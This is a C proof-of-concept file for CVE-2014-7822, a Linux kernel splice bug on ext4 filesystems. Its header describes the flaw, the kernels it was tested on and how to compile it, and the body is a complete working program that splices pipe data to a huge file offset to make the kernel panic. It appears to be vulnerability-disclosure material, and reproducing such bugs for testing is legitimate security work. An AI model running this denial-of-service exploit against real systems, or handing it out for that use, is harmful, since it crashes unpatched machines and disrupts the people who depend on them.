/* ----------------------------------------------------------------------------------------------------
 * cve-2014-7822_poc.c
 * 
 * The implementation of certain splice_write file operations in the Linux kernel before 3.16 does not enforce a restriction on the maximum size of a single file
 * which allows local users to cause a denial of service (system crash) or possibly have unspecified other impact via a crafted splice system call, 
 * as demonstrated by use of a file descriptor associated with an ext4 filesystem. 
 *
 * 
 * This is a POC to reproduce vulnerability. No exploitation here, just simple kernel panic.
 * Works on ext4 filesystem
 * Tested on Ubuntu with 3.13 and 3.14 kernels
 * 
 * Compile with gcc -fno-stack-protector -Wall -o cve-2014-7822_poc cve-2014-7822_poc.c   
 * 
 * 
 * Emeric Nasi - www.sevagas.com
 *-----------------------------------------------------------------------------------------------------*/


/* -----------------------   Includes ----------------------------*/

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>

#define EXPLOIT_NAME "cve-2014-7822"
#define EXPLOIT_TYPE DOS

#define JUNK_SIZE 30000

/* -----------------------   functions ----------------------------*/


/* Useful:
 * 
+============+===============================+===============================+
| \ File flag|                               |                               |
|      \     |     !EXT4_EXTENTS_FL          |        EXT4_EXTETNS_FL        |
|Fs Features\|                               |                               |
+------------+-------------------------------+-------------------------------+
| !extent    |   write:      2194719883264   | write:       --------------   |
|            |   seek:       2199023251456   | seek:        --------------   |
+------------+-------------------------------+-------------------------------+
|  extent    |   write:      4402345721856   | write:       17592186044415   |
|            |   seek:      17592186044415   | seek:        17592186044415   |
+------------+-------------------------------+-------------------------------+
*/


/**
 * Poc for cve_2014_7822 vulnerability
 */
int main()
{
    int pipefd[2];
    int result;
    int in_file;
    int out_file;
    int zulHandler;
    loff_t viciousOffset = 0;
    
    char junk[JUNK_SIZE]  ={0};
    
    result = pipe(pipefd);
 
    // Create and clear zug.txt and zul.txt files
    system("cat /dev/null > zul.txt");
    system("cat /dev/null > zug.txt");
    
    // Fill zul.txt with A
    zulHandler = open("zul.txt", O_RDWR);
    memset(junk,'A',JUNK_SIZE);
    write(zulHandler, junk, JUNK_SIZE);
  close(zulHandler);

  //put content of zul.txt in pipe
  viciousOffset = 0;
   in_file = open("zul.txt", O_RDONLY);
    result = splice(in_file, 0, pipefd[1], NULL, JUNK_SIZE, SPLICE_F_MORE | SPLICE_F_MOVE);
    close(in_file);
  

  // Put content of pipe in zug.txt
  out_file = open("zug.txt", O_RDWR); 
  viciousOffset =   118402345721856; // Create 108 tera byte file... can go up as much as false 250 peta byte ext4 file size!!
  printf("[cve_2014_7822]: ViciousOffset = %lu\n", (unsigned long)viciousOffset);
            
    result = splice(pipefd[0], NULL, out_file, &viciousOffset, JUNK_SIZE , SPLICE_F_MORE | SPLICE_F_MOVE); //8446744073709551615
    if (result == -1)
    {
        printf("[cve_2014_7822 error]: %d - %s\n", errno, strerror(errno));
        exit(1);
  }
    close(out_file);

    close(pipefd[0]);
    close(pipefd[1]);
    
    
    //Open  zug.txt 
  in_file = open("zug.txt", O_RDONLY);
    close(in_file);
   
  printf("[cve_2014_7822]: POC triggered, ... system will panic after some time\n");
  
  return 0;
}

